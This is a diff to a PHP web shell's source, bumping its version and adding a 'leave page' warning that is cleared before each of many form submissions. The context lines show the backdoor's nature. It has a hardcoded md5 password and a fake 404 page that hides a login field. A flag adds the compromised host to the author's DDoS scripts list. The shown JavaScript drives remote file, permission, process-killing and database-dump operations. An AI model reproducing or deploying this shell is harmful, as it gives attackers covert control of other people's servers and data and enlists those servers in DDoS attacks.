@@ -1,6 +1,6 @@
 <?php
 $pass               = md5("pw");
-$version            = 2.89;
+$version            = 2.9;
 $adaptiveerrorpage  = true; //Get Default 404 page and replicate it, but add a login text field in the center at the bottom
 $checkforupdates    = true;
 $helpsupportbooter  = true; //True adds the shell to my ddos scripts list, I can't log in providing you change the password above
@@ -347,6 +347,9 @@ u{text-decoration: none;color:#777;float:left;display:block;width:150px;margin-r
 .drives span {margin:auto 7px;}
 </style>
 <script type="text/javascript">
+window.onbeforeunload = function(){
+  return \'Are you sure you want to leave?\';
+};
 function CheckAll(form) {
 	for(var i=0;i<form.elements.length;i++) {
 		var e = form.elements[i];
@@ -362,6 +365,7 @@ function createdir(){
 	newdirname = prompt(\'Please input the directory name:\', \'\');
 	if (!newdirname) return;
 	$(\'createdir\').newdirname.value=newdirname;
+	window.onbeforeunload = null;
 	$(\'createdir\').submit();
 }
 function fileperm(pfile){
@@ -370,10 +374,12 @@ function fileperm(pfile){
 	if (!newperm) return;
 	$(\'fileperm\').newperm.value=newperm;
 	$(\'fileperm\').pfile.value=pfile;
+	window.onbeforeunload = null;
 	$(\'fileperm\').submit();
 }
 function setsort(k) {
 	$(\'gooddbform\').order.value=k;
+	window.onbeforeunload = null;
 	$(\'gooddbform\').submit();
 }
 function copyfile(sname){
@@ -382,18 +388,22 @@ function copyfile(sname){
 	if (!tofile) return;
 	$(\'copyfile\').tofile.value=tofile;
 	$(\'copyfile\').sname.value=sname;
+	window.onbeforeunload = null;
 	$(\'copyfile\').submit();
 }
 function unzipfile(unzipfile){
 	$(\'unzipfile\').unzipfile.value=unzipfile;
+	window.onbeforeunload = null;
 	$(\'unzipfile\').submit();
 }
 function ungzfile(ungzfile){
 	$(\'ungzfile\').ungzfile.value=ungzfile;
+	window.onbeforeunload = null;
 	$(\'ungzfile\').submit();
 }
 function untarfile(untarfile){
 	$(\'untarfile\').untarfile.value=untarfile;
+	window.onbeforeunload = null;
 	$(\'untarfile\').submit();
 }
 function copyfolder(srcdir){
@@ -402,6 +412,7 @@ function copyfolder(srcdir){
 	if (!tofolder) return;
 	$(\'copyfolder\').tofolder.value=tofolder;
 	$(\'copyfolder\').srcdir.value=srcdir;
+	window.onbeforeunload = null;
 	$(\'copyfolder\').submit();
 }
 function rename(oldname){
@@ -411,6 +422,7 @@ function rename(oldname){
 	if (!newfilename) return;
 	$(\'rename\').newfilename.value=newfilename;
 	$(\'rename\').oldname.value=oldname;
+	window.onbeforeunload = null;
 	$(\'rename\').submit();
 }
 function dofile(doing,thefile,m){
@@ -421,6 +433,7 @@ function dofile(doing,thefile,m){
 	if (thefile){
 		$(\'filelist\').thefile.value=thefile;
 	}
+	window.onbeforeunload = null;
 	$(\'filelist\').submit();
 }
 function createfile(nowpath){
@@ -433,17 +446,20 @@ function opfile(action,opfile,dir){
 	$(\'fileopform\').action.value=action;
 	$(\'fileopform\').opfile.value=opfile;
 	$(\'fileopform\').dir.value=dir;
+	window.onbeforeunload = null;
 	$(\'fileopform\').submit();
 }
 function killproc(pid){
 	$(\'killprocform\').action.value=\'process\';
 	$(\'killprocform\').pid.value=pid;
 	$(\'killprocform\').doing.value=\'killproc\';
+	window.onbeforeunload = null;
 	$(\'killprocform\').submit();
 }
 function killprocm(){
 	$(\'proclist\').action.value=\'process\';
 	$(\'proclist\').doing.value=\'killproc\';
+	window.onbeforeunload = null;
 	$(\'proclist\').submit();
 }
 function godir(dir,view_writable){
@@ -451,11 +467,13 @@ function godir(dir,view_writable){
 		$(\'godir\').view_writable.value=view_writable;
 	}
 	$(\'godir\').dir.value=dir;
+	window.onbeforeunload = null;
 	$(\'godir\').submit();
 }
 function getsize(getdir,dir){
 	$(\'getsize\').getdir.value=getdir;
 	$(\'getsize\').dir.value=dir;
+	window.onbeforeunload = null;
 	$(\'getsize\').submit();
 }
 function editrecord(action, base64, tablename){
@@ -465,11 +483,13 @@ function editrecord(action, base64, tablename){
 	$(\'recordlist\').doing.value=action;
 	$(\'recordlist\').base64.value=base64;
 	$(\'recordlist\').tablename.value=tablename;
+	window.onbeforeunload = null;
 	$(\'recordlist\').submit();
 }
 function moddbname(dbname) {
 	if(!dbname) return;
 	$(\'gooddbform\').dbname.value=dbname;
+	window.onbeforeunload = null;
 	$(\'gooddbform\').submit();
 }
 function settable(tablename,doing,page) {
@@ -481,6 +501,7 @@ function settable(tablename,doing,page) {
 		$(\'gooddbform\').page.value=page;
 	}
 	$(\'gooddbform\').tablename.value=tablename;
+	window.onbeforeunload = null;
 	$(\'gooddbform\').submit();
 }
 function sv(action,nowpath,p1,p2,p3,p4,p5,charsetpage) {
@@ -496,6 +517,7 @@ function sv(action,nowpath,p1,p2,p3,p4,p5,charsetpage) {
 function g(action,nowpath,p1,p2,p3,p4,p5,charsetpage) {
 	if(!action) return;
 	sv(action,nowpath,p1,p2,p3,p4,p5,charsetpage);
+	window.onbeforeunload = null;
 	$(\'opform\').submit();
 }
 </script>
@@ -1429,6 +1451,7 @@ function mysqlfile(doing){
 	$(\'mysqlfile\').dbpass.value=$(\'dbinfo\').dbpass.value;
 	$(\'mysqlfile\').dbname.value=$(\'dbinfo\').dbname.value;
 	$(\'mysqlfile\').charset.value=$(\'dbinfo\').charset.value;
+	window.onbeforeunload = null;
 	$(\'mysqlfile\').submit();
 }
 </script>
@@ -1847,7 +1870,7 @@ function mysqlfile(doing){
 					}
 					p('<td>&nbsp;</td>');
 					p('</tr>');
-					p("<tr class=\"".bg()."\"><td colspan=\"".($highver ? 9 : 7)."\"><input name=\"saveasfile\" value=\"1\" type=\"checkbox\" /> Save as file <input class=\"input\" name=\"bak_path\" value=\"".SA_ROOT.$dbname.".sql\" type=\"text\" size=\"60\" /> <input class=\"bt\" type=\"button\" value=\"Export selection table\" onclick=\"$('doing').value='dump';$('dbform').submit();\" /></td></tr>");
+					p("<tr class=\"".bg()."\"><td colspan=\"".($highver ? 9 : 7)."\"><input name=\"saveasfile\" value=\"1\" type=\"checkbox\" /> Save as file <input class=\"input\" name=\"bak_path\" value=\"".SA_ROOT.$dbname.".sql\" type=\"text\" size=\"60\" /> <input class=\"bt\" type=\"button\" value=\"Export selection table\" onclick=\"$('doing').value='dump';window.onbeforeunload = null;$('dbform').submit();\" /></td></tr>");
 					p("</table>");
 				} else {
 					p('<p class="red b">No tables</p>');
